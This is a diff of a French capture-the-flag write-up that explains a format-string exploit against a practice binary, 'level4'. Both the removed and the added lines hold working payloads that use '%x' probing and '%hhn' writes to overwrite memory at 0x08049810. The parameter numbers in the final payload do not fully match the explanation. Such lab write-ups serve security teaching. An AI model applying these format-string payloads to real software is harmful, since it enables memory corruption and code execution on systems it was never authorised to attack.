@@ -1,3 +1,15 @@
-
-(python -c 'print "A%41$hhnA" + "%42$hhn" + "A"*66 + "%43$hhn" + "A"*17 + "%44$hhn" +
-"AAA\x13\x98\x04\x08\x12\x98\x04\x08\x10\x98\x04\x08\x11\x98\x04\x08"' ; cat) | ./level4
+Cet exercice est quasiment similaire au précédent, seulement, ce qu'il faut
+ecrire est un poil plus complexe: ecrire 0x01025544 a l'adresse 0x08049810.
+Pour commencer, meme payload qu'au challenge precedent pour trouver le debut
+de notre buffer:
+(python -c 'print "AAAA" + " %x"*30') | ./level4
+et on trouve notre 0x41414141 au 13eme parametre.
+Ensuite on va se servir du modificateur de longueur hh pour ecrire %n sur un seul
+octet. La premiere chose a surmonter sera d'ecrire 01 sur le premier emplacement
+de notre addresse et alors qu'il y a deja 16 octets d'ecrit pour les parametres.
+Pour remedier a ca, il suffit simplement decrire plus 257 characteres au lieu de
+1, explication:
+257 en binaire donne 00000001 00000001 seulement, %hhn n'ecrit que 1 octet donc
+257 ecrira 00000001 a l'adresse voulu. Ensuite, le payload se construit tout seul
+avec les bon nombres ecris au bon endroit:
+(python -c 'print "\x13\x98\x04\x08\x12\x98\x04\x08\x10\x98\x04\x08\x11\x98\x04\x08" + "A"*241 + "%12$hhnA%13$hhn" + "A"*66 + "%14$n" + "A"*17 + "%15$n"' ; cat) | ./level4
